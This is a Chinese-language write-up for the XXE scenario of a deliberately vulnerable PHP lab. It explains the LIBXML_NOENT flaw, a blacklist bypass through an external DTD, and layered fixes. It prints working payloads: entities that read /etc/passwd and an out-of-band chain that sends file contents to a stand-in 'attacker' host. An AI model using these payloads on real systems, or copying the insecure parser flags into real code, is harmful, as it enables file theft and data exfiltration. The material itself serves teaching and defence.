# XXE（XML 外部实体注入）Writeup

> 场景目录：`html/xxe/` · 机读 PoC：`pocs/vulnlab-xxe-external-entity.yaml`
> CI 断言：6 条（见 `tests/verify_lab.py`）

---

## 一、原理：漏洞藏在解析器的「开关」里

前面几个场景的漏洞点都能在一行代码里指出来：拼接 SQL、拼接 shell 命令、拼接待包含的路径。
XXE 不太一样：

```php
$doc = simplexml_load_string($xml, 'SimpleXMLElement', LIBXML_NOENT);
//                                                 ^^^^^^^^^^^^
//                                                 这里
```

**这行代码没有拼接任何东西，用户输入也没有参与字符串构造。**
单单读它，看不出任何问题 —— 问题在第三个参数这个**标志位**上。

### 1.1 `LIBXML_NOENT` 是什么意思

字面意思是 *substitute entities*（替换实体）。
而 XML 的「实体」是可以指向**外部资源**的：

```xml
<!ENTITY xxe SYSTEM "file:///etc/passwd">
```

`SYSTEM` 后面是一个 URI —— 可以是本地文件，也可以是远程 URL。
解析器遇到 `&xxe;` 这个引用时，会去把那个资源读进来，填在引用位置。

所以「替换实体」这四个字，实际含义是：

> **把外部资源的内容读进来，放进文档里。**

打开这个开关，就等于把「读任意文件 / 发任意请求」的能力交给了文档作者。

### 1.2 攻击者要做的只有一件事

自己写一个实体声明：

```xml
<?xml version="1.0"?>
<!DOCTYPE order [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">   <!-- ① 声明：这个实体指向那个文件 -->
]>
<order>
  <id>&xxe;</id>                              <!-- ② 引用：解析器会把内容填在这里 -->
</order>
```

应用随后读 `$order->id` 时，拿到的已经是文件内容了 ——
**应用根本不知道 `id` 这个字段被「换」过一次。**

### 1.3 为什么它常出现在「看起来正常」的代码里

对比一下前面几个场景：

| 场景 | 漏洞的来源 |
|---|---|
| SQL 注入 | 开发者**拼错**了字符串 |
| 命令注入 | 开发者**拼错**了字符串 |
| 文件包含 | 开发者**漏了**路径校验 |
| **XXE** | 开发者**开了一个功能** |

XXE 不属于「写错了」，而属于「用了某个能力，但没意识到它有多大」。
`LIBXML_NOENT` 是 XML 解析器的**正常功能**（在 DTD 驱动的文档里，实体替换是标准行为），
开发者打开它往往是为了让某些合法文档能被解析。

**这也是为什么 XXE 的修复不是「别拼错」，而是「关掉用不到的能力」。**

---

## 二、low 档：完全放开

### 2.1 漏洞代码

```php
$doc = @simplexml_load_string($xml, 'SimpleXMLElement', LIBXML_NOENT);
// 没有 LIBXML_NONET、没有禁掉外部实体加载器、没有 DTD 检查
```

业务是个订单查询接口：提交 `<order><id>1001</id></order>`，返回 `<id>` 的内容。

### 2.2 利用

```
<?xml version="1.0"?>
<!DOCTYPE order [
  <!ENTITY xxe SYSTEM "xxe_probe.txt">
]>
<order><id>&xxe;</id></order>
```

解析后 `$order->id` 就是 `xxe_probe.txt` 的内容 —— 页面上「订单号」那一栏显示出来的是文件内容。

### 2.3 为什么判据用「演示文件」而不是系统文件

常见的 payload 会去读 `/etc/passwd` 或 `Windows/win.ini`。本项目**刻意不用**：

| | 系统文件 | 靶场自带的演示文件 |
|---|---|---|
| 是否存在 | 因系统而异 | 一定存在 |
| 内容是否固定 | 因机器而异 | 固定标记串 |
| 判据的含义 | 「这台机器上恰好有这个文件」 | 「XXE 是否成立」 |

用系统文件会让「到底读到没有」这件事**依赖于环境形态**。
判据一旦依赖环境，换个机器就可能失效 —— 这和文件包含场景里
「用 `../../../../Windows/win.ini` 做判据、结果被目录深度坑掉」是同一类问题。

所以这里用一个固定内容的演示文件（`html/xxe/xxe_probe.txt`），
判据只取决于漏洞本身。

---

## 三、medium 档：黑名单与外部 DTD 绕过

### 3.1 防护措施

```php
$blacklist = ['<!ENTITY', '<!entity', '<! Entity'];
foreach ($blacklist as $bad) {
    if (strpos($xml, $bad) !== false) {
        /* 拦截 */
    }
}
$doc = simplexml_load_string($xml, 'SimpleXMLElement', LIBXML_NOENT | LIBXML_DTDLOAD);
```

「不许声明实体」这个方向是对的 —— **要利用 XXE 就必须声明一个实体**。

### 3.2 为什么它挡不住

问题是：**实体不一定要在文档里声明。**

XML 的 DTD 有两个位置：

| 位置 | 写法 | 过滤器看得见吗 |
|---|---|---|
| **内部子集** | `<!DOCTYPE order [ <!ENTITY ...> ]>` | ✅ 看得见 |
| **外部子集** | `<!DOCTYPE order SYSTEM "http://attacker/evil.dtd">` | ❌ 看不见 |

外部子集是**另一个文件**。文档里只留下一句 `SYSTEM "地址"`，
实体声明的正文在那边 —— 过滤器检查的是请求体，自然什么也看不到。

于是绕过就成立了：

```xml
<?xml version="1.0"?>
<!DOCTYPE order SYSTEM "attacker.dtd">
<order><id>&xxe;</id></order>
```

请求体里**一个 `<!ENTITY` 都没有**，黑名单放行。
而 `attacker.dtd` 里写着：

```
<!ENTITY xxe SYSTEM "xxe_probe.txt">
```

解析器把这份 DTD 拉下来，照着声明展开实体 —— 文件照样被读出来。

### 3.3 这一档真正想说明的事

绕过的关键不是「黑名单少写了一个字符串」，而是**它管错了地方**：

> 过滤器检查的是「**文档里写了什么**」，
> 解析器执行的是「**文档 + 它引用的所有外部资源**」的合并结果。
>
> 这两者的**作用范围**不一致。

这句话是整个靶场反复出现的那个模式，只是每次表现不同：

| 场景 | 过滤器看到 | 实际执行 |
|---|---|---|
| SQL 注入 | 替换后剩下的文本 | MySQL 逐字符解析关键字 |
| 文件包含 | 替换后剩下的路径 | 内核按路径语义解析 |
| 反序列化 | 字符串里的类名（区分大小写） | PHP 按不区分大小写找类 |
| **XXE** | **请求体里的文本** | **文档 + 外部 DTD 的合并结果** |

**过滤器对输入的理解，和解析器对输入的理解，不是同一个理解。**

### 3.4 关于 `LIBXML_DTDLOAD` 的说明

本档解析时多传了一个 `LIBXML_DTDLOAD`（加载外部 DTD），这不是随手加的 ——
真实项目里它很常见：有些 XML 格式靠 DTD 描述结构，必须把外部子集拉下来才能正确解析
（对接行业标准报文、兼容老系统等）。

需要说清楚的是：**打开它本身不等于「有漏洞」**。
`LIBXML_NOENT` 才是「把内容读进来」的那一位。
`LIBXML_DTDLOAD` 的作用是让上一条防线失效 ——
它把「实体声明可以放在请求体之外」这个事实变得可用。

顺带一个细节：low 档并没有传 `DTDLOAD`，所以在 low 档里
**外部 DTD 那条载荷反而不生效**（DTD 没被加载，实体解析不出来）。
这也从侧面说明：漏洞是「标志位的组合」决定的，不是单个开关。

---

## 四、high 档：三层防护

### 4.1 修复代码

```php
// ② 外部实体加载器换成「一律返回 null」
libxml_set_external_entity_loader(static function () { return null; });

// ③ 按业务需要收窄输入 —— 本接口用不到 DTD
if (stripos($xml, '<!DOCTYPE') !== false || stripos($xml, '<!ENTITY') !== false) {
    // 拒绝
}

// ① 不传 LIBXML_NOENT（只传 LIBXML_NONET 作为额外的纵深防御）
$doc = simplexml_load_string($xml, 'SimpleXMLElement', LIBXML_NONET);
```

### 4.2 三层各自的角色

| 层 | 做法 | 挡住什么 | 弱点 |
|---|---|---|---|
| ① | 不传 `LIBXML_NOENT` | 实体不被替换 | **「不传某个参数」很容易被后人改回去** |
| ② | 禁掉外部实体加载器 | 任何外部资源都取不到 | 需要意识到它是进程级设置 |
| ③ | 拒绝带 DOCTYPE 的文档 | 直接砍掉整类输入 | 只适用于「业务真的不需要 DTD」的场景 |

第 ① 层的弱点值得展开说：

它是**一个「没有写」的防护**。代码里看不到它，也搜不到它。
几个月后有人为了支持某个格式加上了 `LIBXML_NOENT` —— 不会有任何报错、
不会有测试失败、Code Review 也未必有人注意到。**它只是悄悄失效了。**

这和反序列化场景里「黑名单会过期」是同一类结构性问题。
所以第 ② 层才是真正的兜底：它不检查输入，而是**拿掉解析器的能力**。

### 4.3 实测：三层任意一层单独存在都能挡住

| 配置 | 内联实体 | 外部 DTD |
|---|---|---|
| `LIBXML_NOENT`（无防护） | ✗ 读到文件 | ✗ 读到文件 |
| 只禁外部加载器 + 有 `NOENT` | ✅ 挡住（解析失败） | ✅ 挡住 |
| 只不传 `NOENT` | ✅ 挡住（实体不展开） | ✅ 挡住 |
| 只做输入收窄 | ✅ 挡住 | ✅ 挡住 |

（「✗ 读到文件」表示攻击成功，「✅ 挡住」表示攻击失败。）

这就是**纵深防御**的实际含义：不是「更严格地过滤」，而是
**让同一个攻击目标有多条互相独立的拦截路径**。

### 4.4 最推荐的方案其实是换掉 XML

如果这个接口只是传一个订单号，那它根本不需要 XML：

```php
$orderId = (int) ($_POST['id'] ?? 0);
```

或者退一步用 JSON：

```php
$data = json_decode($body, true);
```

`json_decode` 既没有实体、也没有 DTD，**从语言层面就不存在这个攻击面**。

这比任何过滤规则都可靠 —— 因为它不是「堵住了攻击路径」，
而是**那条路径不存在**。

---

## 五、其他值得知道的手法

### 5.1 Blind XXE（无回显）

如果应用不把解析结果返回（最常见的情况），上面对 `<id>` 的写法就没用了。
这时有两类思路：

**① 带外通道（OOB）** —— 让服务器主动把数据发出来：

```xml
<!DOCTYPE order [
  <!ENTITY % file SYSTEM "file:///etc/passwd">
  <!ENTITY % dtd SYSTEM "http://attacker/evil.dtd">
  %dtd;
]>
```

攻击者服务器上的 `evil.dtd` 把 `%file;` 的内容拼进一个 URL，再请求回来：

```
<!ENTITY % all "<!ENTITY send SYSTEM 'http://attacker/?%file;'>">
%all;
```

于是文件内容出现在攻击者的访问日志里。注意这里用的是**参数实体**（`%name;` / `%name`）——
参数实体只能在 DTD 里使用，这正是它适合做带外通道的原因。

**② 报错回显** —— 把内容塞进一个不合法的东西里，让错误信息把它带出来。

### 5.2 参数实体绕过「`<!ENTITY` 黑名单」

参数实体的声明长这样：`<!ENTITY % name ...>`。它同样含 `<!ENTITY`，
所以面对 medium 那种黑名单时并不能直接绕过 ——
但它说明了一件事：**实体有两类（普通实体 / 参数实体），
很多只考虑了一种的防护是不完整的。**

### 5.3 编码绕过

过滤是按字节匹配的，而 XML 解析器会**按声明去解码**。
把整个文档用 UTF-16 编码发过去，`<!ENTITY` 在字节层就不再是那 8 个 ASCII 字符，
而解析器读出来仍然是一个合法的实体声明。

**又是「过滤器看到的东西」和「解析器看到的东西」不一致。**

### 5.4 XXE 不只是读文件

| 协议 / 写法 | 能做什么 |
|---|---|
| `file://` | 读本地文件 |
| `http://` | **发起服务端请求** —— 变成 SSRF，可探测内网 |
| `php://filter/...` | 读 PHP 源码（和文件包含场景的用法一样） |
| `expect://` | 在装了 expect 扩展的环境下**直接执行命令** |
| `gopher://` | 构造任意 TCP 流量（打内网 Redis/Memcached 等） |

也就是说，XXE 的下游影响面取决于**环境里有哪些协议包装器**，
而这一点应用代码通常完全没意识到。

> 这和 SSRF 场景是同一个道理：**输入校验要针对「最终会发生什么」，
> 而不是「输入长什么样」。**

---

## 六、防御清单

| 优先级 | 做法 | 说明 |
|---|---|---|
| **①** | **不用 XML** | 换 JSON / 表单。攻击面直接消失 |
| **②** | 禁掉外部实体加载器 | `libxml_set_external_entity_loader(fn() => null)` |
| **③** | 不传 `LIBXML_NOENT` | 实体替换默认关闭，不要为了「方便」打开 |
| **④** | 输入收窄 | 业务不需要 DTD 就拒绝带 `DOCTYPE` 的文档 |
| **⑤** | 用 `LIBXML_NONET` | 额外禁止网络访问（挡不住 `file://`，属于纵深防御） |
| ❌ | **只过滤 `<!ENTITY`** | **本档 medium 就是为了说明这条不够** |

按有效性排序：**① > ②③ > ④ > ⑤ ≫ ❌**。

最后一行需要强调：**「我过滤了 `<!ENTITY`」不是修复**。
实体声明可以放在请求体之外，过滤器看不到，解析器却会去加载它。

---

## 七、和本靶场其他场景的联系

### 7.1 「过滤器看到的东西 ≠ 解析器看到的东西」

这是靶场里第四次出现同一个模式：

| 场景 | 过滤器看到 | 实际执行 | 缝隙 |
|---|---|---|---|
| SQL 注入 | 删掉 `union` 后的文本 | MySQL 逐字符解析 | 删除动作把片段拼了回来 |
| 文件包含 | 删掉 `../` 后的路径 | 内核按路径语义解析 | 同上 |
| 反序列化 | 字符串里的类名 | PHP 不区分大小写找类 | 大小写 |
| **XXE** | **请求体文本** | **文档 + 外部 DTD** | **引用范围** |

四种绕过的表面机制完全不同，但结构是同一个：
**防护判断的「输入」和执行判断的「输入」不是同一个东西。**

### 7.2 与 SSRF 的联系

XXE 的 `SYSTEM "http://..."` 是一次**服务端请求** —— 它天然具备 SSRF 的能力。
SSRF 场景里那条结论可以直接搬过来用：

> **校验必须发生在「解析之后」** ——
> 因为解析前的字符串有无数种等价写法。

XXE 的 `file://` / `http://` 是同样的道理：
真正需要控制的是「允许访问哪些资源」，而不是「输入里有没有某个词」。

### 7.3 与文件包含的联系

两者都能读文件，但触发方式不同：

| | 文件包含 | XXE |
|---|---|---|
| 漏洞点 | 路径参数可控 | 解析器开了实体替换 |
| 读源码 | `php://filter/convert.base64-encode` | 同样可用 `php://filter` |
| 典型修复 | 白名单映射 | 关掉解析器能力 |

有意思的是两者都能用 `php://filter` —— 因为 PHP 的流包装器是**全局注册**的，
任何接受 URI 的地方都自动继承了这个能力。
**这提醒我们：能力是环境给的，不是这行代码给的。**

---

## 八、延伸阅读

- [OWASP: XML External Entity (XXE) Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/XML_External_Entity_Prevention_Cheat_Sheet.html)
- [PHP: simplexml_load_string - Manual](https://www.php.net/manual/en/function.simplexml-load-string.php) —— 各个 `LIBXML_*` 标志的含义
- [PHP: libxml_set_external_entity_loader](https://www.php.net/manual/en/function.libxml-set-external-entity-loader.php)
- [XML Entity Expansion / Billion Laughs](https://en.wikipedia.org/wiki/Billion_laughs_attack) —— 同一套机制还能做拒绝服务
